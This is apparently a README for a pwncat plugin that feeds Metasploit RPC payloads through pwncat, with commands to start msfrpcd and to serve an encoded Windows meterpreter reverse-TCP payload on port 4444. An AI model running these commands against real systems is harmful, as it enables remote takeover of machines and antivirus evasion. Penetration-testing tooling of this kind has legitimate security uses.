# PSE: Metasploit Plugin

A script to allow msfrpc payloads to be directly passed through pwncat

## Usage

Start msfrcpd

```
$ msfrpcd -P mypassword -n -f -a 127.0.0.1
[*] MSGRPC starting on 0.0.0.0:55553 (SSL):Msg...
[*] MSGRPC ready at 2020-04-20 23:49:39 -0400.
```

Meterpreter example
```
export MSF_PASSWD=mypassword ; pwncat -l 4444 --script-recv msfplugin.py -P windows/x64/meterpreter_reverse_tcp -O LHOST=ip.address -e x86/shikata_ga_nai 8
```